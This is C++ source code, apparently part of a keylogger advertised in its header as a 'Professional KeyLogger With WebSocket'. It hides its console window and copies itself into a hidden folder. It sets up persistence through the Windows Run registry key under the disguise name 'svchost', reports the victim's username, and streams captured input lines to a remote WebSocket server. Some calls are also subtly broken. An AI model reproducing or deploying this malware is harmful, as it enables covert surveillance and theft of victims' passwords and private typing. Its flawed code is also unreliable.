/**
*
* | ============================================================ |
* |  Coded By : ZELROTH                                          |
* |  Date : 2024/12/9 - 9:54:23                                  |
* |  Professional KeyLogger With WebSocket                       |
* |  Written In C++ And Python Programming Languages             |
* | ============================================================ |
*
**/


#include "WebSocketClient.hpp"

WebSocketClient::WebSocketClient(const std::string& url) : url(url) {
    client_instance.init_asio();
    websocketpp::lib::error_code ec;
    connection_hdl = client_instance.get_connection(url, ec);
    if (ec) throw std::runtime_error("Connection error: " + ec.message());
    client_instance.connect(connection_hdl);
}

void WebSocketClient::sendMessage(const std::string& message) {
    websocketpp::lib::error_code ec;
    client_instance.send(connection_hdl, message, websocketpp::frame::opcode::text, ec);
    if (ec) {
        std::cerr << "Error sending message: " << ec.message() << std::endl;
    }
}

std::string WebSocketClient::generateRandomString(size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> distribution(0, sizeof(charset) - 2);
    
    for (size_t i = 0; i < length; ++i) {
        result += charset[distribution(generator)];
    }
    return result;
}

void WebSocketClient::hideShell() {
#ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
#else
    int devNull = open("/dev/null", O_RDWR);
    dup2(devNull, STDOUT_FILENO);
    dup2(devNull, STDERR_FILENO);
    close(devNull);
#endif
}

void WebSocketClient::addToStartup(const std::string& file_path) {
#ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "svchost", 0, REG_SZ, (const BYTE*)file_path.c_str(), file_path.size() + 1);
        RegCloseKey(hKey);
    }
#else
    std::string command = "cp " + file_path + " ~/.config/autostart/";
    system(command.c_str());
#endif
}

void WebSocketClient::hideDirectory(const std::string& path) {
#ifdef _WIN32
    std::string command = "attrib +h +s \"" + path + "\"";
    system(command.c_str());
#else
    std::string command = "chattr +h " + path;
    system(command.c_str());
#endif
}

void WebSocketClient::run() {
    hideShell();

    std::string username = boost::process::system("whoami");
    sendMessage("I'm Connected | Username : " + username);

    std::string folder_name = generateRandomString(16);
    std::string folder_path;

#ifdef _WIN32
    folder_path = "C:\\" + folder_name;
#else
    folder_path = "/home/" + folder_name;
#endif

    std::filesystem::create_directory(folder_path);
    hideDirectory(folder_path);

    char file_path[MAX_PATH];
    GetModuleFileName(NULL, file_path, MAX_PATH);
    std::string current_file_path = file_path;

    std::string new_file_path = folder_path + "\\" + std::filesystem::path(file_path).filename().string();
    MoveFile(current_file_path.c_str(), new_file_path.c_str());
    addToStartup(new_file_path);

    std::vector<std::string> data;
    std::string text;

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        char event;
        std::cin >> event;
        data.push_back(std::string(1, event));

        if (event == '\n') {
            text = std::accumulate(data.begin(), data.end(), std::string());
            sendMessage(text);
            data.clear();
        }
    }
}
